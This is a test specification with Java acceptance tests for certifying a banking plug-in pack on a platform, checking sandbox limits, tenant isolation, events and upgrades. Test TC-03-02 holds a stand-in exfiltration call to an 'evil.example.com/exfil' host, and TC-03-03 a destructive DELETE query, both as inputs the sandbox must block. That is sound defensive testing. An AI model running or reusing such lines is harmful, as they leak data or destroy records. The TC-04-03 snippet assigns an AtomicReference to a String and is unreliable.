# TDD Specification: Banking Domain Pack Integration with AppPlatform

**Document Type**: Test-Driven Design (TDD) Specification  
**Authority Level**: 4 — Prompt / Generation Artifact  
**Version**: 1.0.0 | **Status**: Active | **Date**: 2026-01-19  
**Pack Under Test**: Banking Domain Pack (reference implementation template)  
**Owner**: AppPlatform Platform Engineering  
**Canonical Path**: `products/app-platform/docs/tdd_spec_banking_integration_v1.md`

---

## Purpose

This TDD spec defines the acceptance tests that a **Banking domain pack** MUST pass to be certified on AppPlatform. It serves as:

1. A reference for Banking domain pack authors writing their own test suite.
2. A template for TDD specs for other domain packs (Insurance, Healthcare, etc.).
3. Input to P-01 Pack Certification's automated gate runner.

All tests are written using the AppPlatform Test Framework (extends `EventloopTestBase`).

---

## Table of Contents

1. [Test Suite Structure](#1-test-suite-structure)
2. [TC-01: DomainManifest Validation](#2-tc-01-domainmanifest-validation)
3. [TC-02: CoreDomainCapability Resolution](#3-tc-02-coredomaincapability-resolution)
4. [TC-03: T2 Rule Sandbox Enforcement](#4-tc-03-t2-rule-sandbox-enforcement)
5. [TC-04: T3 Rule Permission Enforcement](#5-tc-04-t3-rule-permission-enforcement)
6. [TC-05: K-15 Calendar Integration](#6-tc-05-k-15-calendar-integration)
7. [TC-06: K-05 Event Publishing](#7-tc-06-k-05-event-publishing)
8. [TC-07: Cross-Pack Communication (EventBus)](#8-tc-07-cross-pack-communication-eventbus)
9. [TC-08: Multi-Tenancy Isolation](#9-tc-08-multi-tenancy-isolation)
10. [TC-09: Lifecycle Hooks](#10-tc-09-lifecycle-hooks)
11. [TC-10: Pack Upgrade Compatibility](#11-tc-10-pack-upgrade-compatibility)

---

## 1. Test Suite Structure

All test classes use the Java test framework:

```java
// Base class for all async tests (MANDATORY per copilot-instructions.md)
// extends EventloopTestBase from libs:activej-test-utils

@DisplayName("Banking Pack Integration Tests")
class BankingPackIntegrationTest extends EventloopTestBase {
    // Tests run via runPromise(() -> ...)
}
```

**Test Data**: Use `TestDataBuilders` from `libs:activej-test-utils`.

**Test Environment**: AppPlatform in-process test harness (`PackTestHarness`) which boots the Kernel modules required by the pack under test.

---

## 2. TC-01: DomainManifest Validation

### TC-01-01: Valid manifest loads without error

```java
@Test
@DisplayName("TC-01-01: Valid banking manifest parses and validates")
void validManifestLoadsWithoutError() {
    // GIVEN
    DomainManifest manifest = TestDataBuilders.bankingManifest()
        .packId("com.acme.banking")
        .version("1.0.0")
        .domainTypes(List.of("banking", "financial-services"))
        .capabilities(List.of(CoreDomainCapability.ENTITY_MANAGEMENT,
                              CoreDomainCapability.WORKFLOW_ORCHESTRATION,
                              CoreDomainCapability.BUSINESS_RULES))
        .requiredKernels(List.of(
            KernelModuleConstraint.of("K-05", ">=3.0.0"),
            KernelModuleConstraint.of("K-07", ">=2.0.0"),
            KernelModuleConstraint.of("K-15", ">=2.0.0", true) // optional
        ))
        .build();

    // WHEN
    ManifestValidationResult result = runPromise(() ->
        manifestValidator.validate(manifest));

    // THEN
    assertThat(result.isValid()).isTrue();
    assertThat(result.errors()).isEmpty();
}
```

### TC-01-02: Unknown domainType is accepted (open string type)

```java
@Test
@DisplayName("TC-01-02: DomainType open string — custom type accepted")
void unknownDomainTypeIsAccepted() {
    // GIVEN
    DomainManifest manifest = TestDataBuilders.bankingManifest()
        .domainTypes(List.of("super-niche-banking-variant"))
        .build();

    // WHEN
    ManifestValidationResult result = runPromise(() ->
        manifestValidator.validate(manifest));

    // THEN
    assertThat(result.isValid()).isTrue(); // open string, not enum
}
```

### TC-01-03: Missing required field fails validation

```java
@Test
@DisplayName("TC-01-03: Missing packId fails manifest validation")
void missingPackIdFailsValidation() {
    // GIVEN
    DomainManifest manifest = TestDataBuilders.bankingManifest()
        .packId(null)
        .build();

    // WHEN
    ManifestValidationResult result = runPromise(() ->
        manifestValidator.validate(manifest));

    // THEN
    assertThat(result.isValid()).isFalse();
    assertThat(result.errors()).anyMatch(e -> e.field().equals("packId"));
}
```

### TC-01-04: Invalid semver in requiredKernels fails validation

```java
@Test
@DisplayName("TC-01-04: Invalid semver range in KernelModuleConstraint fails validation")
void invalidSemverRangeFailsValidation() {
    // GIVEN
    DomainManifest manifest = TestDataBuilders.bankingManifest()
        .requiredKernels(List.of(
            KernelModuleConstraint.of("K-05", "not-a-semver") // invalid
        ))
        .build();

    // WHEN
    ManifestValidationResult result = runPromise(() ->
        manifestValidator.validate(manifest));

    // THEN
    assertThat(result.isValid()).isFalse();
    assertThat(result.errors()).anyMatch(e -> e.field().equals("requiredKernels[0].version"));
}
```

---

## 3. TC-02: CoreDomainCapability Resolution

### TC-02-01: Declared capabilities are registered in Kernel catalog

```java
@Test
@DisplayName("TC-02-01: Declared CoreDomainCapabilities register in Kernel")
void declaredCapabilitiesRegisteredInKernel() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest());

    // WHEN
    List<CoreDomainCapability> registered = runPromise(() ->
        harness.kernelCatalog().getCapabilities("com.acme.banking", TENANT_ID));

    // THEN
    assertThat(registered).contains(
        CoreDomainCapability.ENTITY_MANAGEMENT,
        CoreDomainCapability.WORKFLOW_ORCHESTRATION,
        CoreDomainCapability.BUSINESS_RULES
    );
}
```

### TC-02-02: Extended capabilities are accessible alongside core capabilities

```java
@Test
@DisplayName("TC-02-02: Extended capabilities accessible via extendedCapabilities field")
void extendedCapabilitiesAccessible() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(
        bankingPackManifest().withExtendedCapabilities(List.of(
            "BANKING_CREDIT_SCORING", "BANKING_SWIFT_MESSAGING"
        ))
    );

    // WHEN
    DomainPackDescriptor descriptor = runPromise(() ->
        harness.packRegistry().describe("com.acme.banking", TENANT_ID));

    // THEN
    assertThat(descriptor.extendedCapabilities()).contains(
        "BANKING_CREDIT_SCORING",
        "BANKING_SWIFT_MESSAGING"
    );
}
```

---

## 4. TC-03: T2 Rule Sandbox Enforcement

T2 rules (Rego, SQL, DSL) run in a sandbox. They MUST NOT access the filesystem, make network calls, or spawn threads.

### TC-03-01: Rego rule evaluates correctly

```java
@Test
@DisplayName("TC-03-01: T2 Rego rule evaluates against input context")
void regoRuleEvaluatesCorrectly() {
    // GIVEN
    String regoPolicy = """
        package banking.limits
        deny if { input.transfer_amount > 10000 }
        """;
    T2RuleReference ruleRef = T2RuleReference.builder()
        .tier("T2").language("rego").path("rules/transfer-limit.rego").build();
    RuleContext ctx = RuleContext.of(Map.of("transfer_amount", 5000));

    // WHEN
    RuleResult result = runPromise(() ->
        ruleEngine.evaluate(ruleRef, regoPolicy, ctx));

    // THEN
    assertThat(result.isDenied()).isFalse();
}
```

### TC-03-02: T2 Rego rule CANNOT make network calls (sandbox enforcement)

```java
@Test
@DisplayName("TC-03-02: T2 rule attempting network call is blocked by sandbox")
void t2RuleNetworkCallIsBlocked() {
    // GIVEN
    String ruleWithNetworkCall = """
        package banking.limits
        response := http.send({"url": "http://evil.example.com/exfil"})
        """;
    T2RuleReference ruleRef = T2RuleReference.builder()
        .tier("T2").language("rego").path("rules/bad-rule.rego").build();

    // WHEN / THEN
    assertThatThrownBy(() -> runPromise(() ->
        ruleEngine.evaluate(ruleRef, ruleWithNetworkCall, RuleContext.empty())))
        .isInstanceOf(SandboxViolationException.class)
        .hasMessageContaining("network access denied");
}
```

### TC-03-03: T2 SQL rule executes within read-only schema scope

```java
@Test
@DisplayName("TC-03-03: T2 SQL rule cannot mutate data (read-only sandbox)")
void t2SqlRuleIsReadOnly() {
    // GIVEN
    T2RuleReference ruleRef = T2RuleReference.builder()
        .tier("T2").language("sql")
        .path("rules/account-balance-check.sql").build();
    String mutatingQuery = "DELETE FROM accounts WHERE id = 1";

    // WHEN / THEN
    assertThatThrownBy(() -> runPromise(() ->
        ruleEngine.evaluateSql(ruleRef, mutatingQuery, RuleContext.empty())))
        .isInstanceOf(SandboxViolationException.class)
        .hasMessageContaining("write operation not permitted in T2 sandbox");
}
```

---

## 5. TC-04: T3 Rule Permission Enforcement

T3 rules (Java, Kotlin, Python, JavaScript) run in a managed thread pool with explicit permissions.

### TC-04-01: T3 Java rule with NETWORK permission can make allowed calls

```java
@Test
@DisplayName("TC-04-01: T3 rule with NETWORK permission executes network call")
void t3RuleWithNetworkPermissionAllowed() {
    // GIVEN
    T3RuleReference ruleRef = T3RuleReference.builder()
        .tier("T3").language("java")
        .path("rules/SwiftMessageValidator.java")
        .permissions(Set.of("NETWORK"))
        .allowedHosts(Set.of("swift.acme-bank.internal"))
        .build();

    // WHEN
    RuleResult result = runPromise(() ->
        ruleEngine.evaluateT3(ruleRef, RuleContext.of(Map.of("swift_msg", "MT103..."))));

    // THEN
    assertThat(result.isAllowed()).isTrue();
}
```

### TC-04-02: T3 rule WITHOUT FILESYSTEM permission cannot read files

```java
@Test
@DisplayName("TC-04-02: T3 rule without FILESYSTEM permission cannot read files")
void t3RuleWithoutFilesystemPermissionBlocked() {
    // GIVEN
    T3RuleReference ruleRef = T3RuleReference.builder()
        .tier("T3").language("java")
        .path("rules/FileReadingRule.java")
        .permissions(Set.of("NETWORK")) // no FILESYSTEM
        .build();

    // WHEN / THEN
    assertThatThrownBy(() -> runPromise(() ->
        ruleEngine.evaluateT3(ruleRef, RuleContext.empty())))
        .isInstanceOf(PermissionDeniedException.class)
        .hasMessageContaining("FILESYSTEM");
}
```

### TC-04-03: T3 rule runs in managed thread pool (not event loop)

```java
@Test
@DisplayName("TC-04-03: T3 rule execution is offloaded to managed thread pool")
void t3RuleRunsInManagedThreadPool() {
    // GIVEN
    String capturedThreadName = new AtomicReference<>();
    T3RuleReference ruleRef = buildT3RuleThatCapturesThreadName(capturedThreadName);

    // WHEN
    runPromise(() -> ruleEngine.evaluateT3(ruleRef, RuleContext.empty()));

    // THEN
    assertThat(capturedThreadName.get()).startsWith("t3-rule-pool-");
    assertThat(capturedThreadName.get()).doesNotStartWith("eventloop-");
}
```

---

## 6. TC-05: K-15 Calendar Integration (Optional)

These tests apply only when the Banking pack's `DomainManifest` includes `CALENDAR_AWARE` in `capabilities`.

### TC-05-01: CalendarDate round-trip through K-15

```java
@Test
@DisplayName("TC-05-01: CalendarDate converts primary UTC to registered calendars")
void calendarDateRoundTrip() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest()
        .withCapability(CoreDomainCapability.CALENDAR_AWARE));
    String primaryUtc = "2026-01-19T10:00:00Z";

    // WHEN
    CalendarDate date = runPromise(() ->
        harness.multiCalendarService().generateCalendarDate(primaryUtc, TENANT_ID));

    // THEN
    assertThat(date.primary()).isEqualTo(primaryUtc);
    assertThat(date.timezone()).isNotBlank();
    assertThat(date.calendars()).containsKey("gregorian");
    // Additional calendars depend on T1 packs installed (e.g. "bs" if Nepal T1 pack installed)
}
```

### TC-05-02: CalendarDate is optional — pack works without K-15 T1 pack

```java
@Test
@DisplayName("TC-05-02: Banking pack works without K-15 T1 calendar pack installed")
void packWorksWithoutCalendarPack() {
    // GIVEN — K-15 T1 pack NOT installed
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest()
        .withoutCalendarT1Pack());

    // WHEN
    AccountTransaction txn = runPromise(() ->
        harness.pack().processTransaction(sampleTransaction()));

    // THEN — no CalendarDate; timestamp field is still present
    assertThat(txn.timestamp()).isNotNull();
    assertThat(txn.calendarDate()).isNull();
}
```

---

## 7. TC-06: K-05 Event Publishing

### TC-06-01: Transaction event published with source_domain_pack_id

```java
@Test
@DisplayName("TC-06-01: Account credited event carries source_domain_pack_id")
void transactionEventCarriesPackId() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest());
    EventCaptor captor = harness.eventBus().captor();

    // WHEN
    runPromise(() -> harness.pack().creditAccount("acc-001", BigDecimal.valueOf(1000)));

    // THEN
    EventEnvelope<?> event = captor.capturedEvents().stream()
        .filter(e -> e.eventType().equals("com.acme.banking.account.credited.v1"))
        .findFirst()
        .orElseThrow();

    assertThat(event.sourceDomainPackId()).isEqualTo("com.acme.banking");
    assertThat(event.timestamp()).isNotNull();
    assertThat(event.tenantId()).isEqualTo(TENANT_ID);
    assertThat(event.eventId()).isNotBlank();
    assertThat(event.correlationId()).isNotBlank();
}
```

### TC-06-02: Published events conform to declared schema version

```java
@Test
@DisplayName("TC-06-02: Published event payload validates against declared schema version")
void publishedEventConformsToSchema() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest());
    SchemaValidator schemaValidator = harness.schemaRegistry()
        .validatorFor("com.acme.banking.account.credited.v1");
    EventCaptor captor = harness.eventBus().captor();

    // WHEN
    runPromise(() -> harness.pack().creditAccount("acc-001", BigDecimal.valueOf(1000)));

    // THEN
    EventEnvelope<?> event = captor.latestEvent("com.acme.banking.account.credited.v1");
    assertThat(schemaValidator.validate(event.payload())).hasNoErrors();
}
```

---

## 8. TC-07: Cross-Pack Communication (EventBus)

### TC-07-01: Banking pack receives events from declared dependency

```java
@Test
@DisplayName("TC-07-01: Banking pack receives KYC verified event from Identity pack")
void bankingPackReceivesCrossPackEvent() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest()
        .withCrossPackDependency("com.acme.identity", ">=1.0.0"));

    // Simulate Identity pack publishing a KYC event
    EventEnvelope<KycVerifiedPayload> kycEvent = EventEnvelope.<KycVerifiedPayload>builder()
        .eventType("com.acme.identity.kyc.verified.v1")
        .sourceDomainPackId("com.acme.identity")
        .tenantId(TENANT_ID)
        .payload(new KycVerifiedPayload("cust-001", "APPROVED"))
        .build();
    harness.eventBus().inject(kycEvent);

    // WHEN
    // Banking pack's subscription handler processes the event
    CustomerProfile profile = runPromise(() ->
        harness.pack().getCustomerProfile("cust-001"));

    // THEN
    assertThat(profile.kycStatus()).isEqualTo("APPROVED");
}
```

### TC-07-02: Events from another tenant are NEVER delivered

```java
@Test
@DisplayName("TC-07-02: Cross-tenant event leakage is impossible")
void crossTenantEventLeakageBlocked() {
    // GIVEN
    String tenantA = "tenant-alpha";
    String tenantB = "tenant-beta";
    PackTestHarness harness = PackTestHarness.bootMultiTenant(bankingPackManifest(), tenantA, tenantB);
    EventCaptor captorB = harness.eventBus().captor(tenantB);

    // Publish event for tenant A
    harness.eventBus().inject(EventEnvelope.builder()
        .sourceDomainPackId("com.acme.banking")
        .eventType("com.acme.banking.account.credited.v1")
        .tenantId(tenantA)
        .payload("{}")
        .build());

    // THEN — tenant B receives nothing
    assertThat(captorB.capturedEvents()).isEmpty();
}
```

---

## 9. TC-08: Multi-Tenancy Isolation

### TC-08-01: Banking pack data is isolated per tenant

```java
@Test
@DisplayName("TC-08-01: Account created in tenant A is invisible from tenant B")
void accountIsolatedPerTenant() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.bootMultiTenant(bankingPackManifest(),
        "tenant-alpha", "tenant-beta");

    runPromise(() -> harness.forTenant("tenant-alpha").pack()
        .createAccount("acc-001", "Alice"));

    // WHEN
    Optional<Account> fromB = runPromise(() ->
        harness.forTenant("tenant-beta").pack().findAccount("acc-001"));

    // THEN
    assertThat(fromB).isEmpty();
}
```

---

## 10. TC-09: Lifecycle Hooks

### TC-09-01: onInstall hook provisions required schema

```java
@Test
@DisplayName("TC-09-01: onInstall sets up pack database schema successfully")
void onInstallProvisionSchema() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.create(bankingPackManifest());

    // WHEN
    InstallResult result = runPromise(() ->
        harness.lifecycle().install(TENANT_ID));

    // THEN
    assertThat(result.status()).isEqualTo(InstallStatus.SUCCESS);
    assertThat(harness.database().tableExists("banking_accounts", TENANT_ID)).isTrue();
    assertThat(harness.database().tableExists("banking_transactions", TENANT_ID)).isTrue();
}
```

### TC-09-02: onUpgrade hook is idempotent

```java
@Test
@DisplayName("TC-09-02: onUpgrade is idempotent — safe to run twice")
void onUpgradeIsIdempotent() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest());
    UpgradeContext ctx = UpgradeContext.from("1.0.0").to("1.1.0");

    // WHEN — run upgrade hook twice
    UpgradeResult firstRun = runPromise(() -> harness.lifecycle().upgrade(ctx, TENANT_ID));
    UpgradeResult secondRun = runPromise(() -> harness.lifecycle().upgrade(ctx, TENANT_ID));

    // THEN — both succeed without error
    assertThat(firstRun).isEqualTo(UpgradeResult.PROCEED);
    assertThat(secondRun).isEqualTo(UpgradeResult.PROCEED);
}
```

### TC-09-03: onUninstall removes all tenant-scoped data

```java
@Test
@DisplayName("TC-09-03: onUninstall removes all tenant-scoped pack data")
void onUninstallRemovesAllData() {
    // GIVEN
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest());
    runPromise(() -> harness.pack().createAccount("acc-001", "Alice"));

    // WHEN
    runPromise(() -> harness.lifecycle().uninstall(TENANT_ID));

    // THEN
    assertThat(harness.database().tableExists("banking_accounts", TENANT_ID)).isFalse();
}
```

---

## 11. TC-10: Pack Upgrade Compatibility

### TC-10-01: Minor version upgrade is non-breaking (backward-compatible events)

```java
@Test
@DisplayName("TC-10-01: Events from v1.0.0 are consumable by v1.1.0 handler")
void minorUpgradeEventsAreBackwardCompatible() {
    // GIVEN — event from old version (v1.0.0 schema)
    String oldEventJson = """
        {
          "account_id": "acc-001",
          "amount": 1000.00,
          "currency": "NPR"
        }
        """; // v1.0.0 schema — no "transaction_type" field

    // WHEN — v1.1.0 handler processes old event
    AccountCreditedHandler handlerV110 = new AccountCreditedHandlerV110();
    AccountCreditedPayload payload = handlerV110.deserialize(oldEventJson);

    // THEN — optional new field defaults gracefully
    assertThat(payload.accountId()).isEqualTo("acc-001");
    assertThat(payload.transactionType()).isEqualTo("UNKNOWN"); // default for missing field
}
```

### TC-10-02: Major version upgrade — old event topic still routed for migration window

```java
@Test
@DisplayName("TC-10-02: Deprecated v1 topic still delivered during migration window")
void deprecatedTopicDeliveredDuringMigrationWindow() {
    // GIVEN — both v1 and v2 topics active (migration window)
    PackTestHarness harness = PackTestHarness.boot(bankingPackManifest()
        .withDeprecatedTopic("com.acme.banking.account.credited.v1",
                             "com.acme.banking.account.credited.v2"));

    EventCaptor captorV1 = harness.eventBus().captor("com.acme.banking.account.credited.v1");
    EventCaptor captorV2 = harness.eventBus().captor("com.acme.banking.account.credited.v2");

    // WHEN — pack publishes on v2 topic + legacy bridge active
    runPromise(() -> harness.pack().creditAccount("acc-001", BigDecimal.valueOf(500)));

    // THEN — v2 topic receives event; v1 topic also bridged during window
    assertThat(captorV2.capturedEvents()).hasSize(1);
    assertThat(captorV1.capturedEvents()).hasSize(1); // bridge active
}
```

---

## Appendix: TestDataBuilders Reference

```java
// Usage pattern — all builders are fluent and return default valid state
DomainManifest manifest = TestDataBuilders.bankingManifest()
    .packId("com.acme.banking")
    .version("1.0.0")
    .build();

// Available builders
TestDataBuilders.bankingManifest()         // Banking domain pack manifest
TestDataBuilders.sampleTransaction()       // AccountTransaction value object
TestDataBuilders.sampleCreditEvent()       // EventEnvelope<AccountCreditedPayload>
TestDataBuilders.kycVerifiedEvent()        // EventEnvelope<KycVerifiedPayload>
TestDataBuilders.kernelConstraint("K-05", ">=3.0.0")
```

---

_This TDD spec is maintained by AppPlatform Platform Engineering and updated with each major Platform API revision._
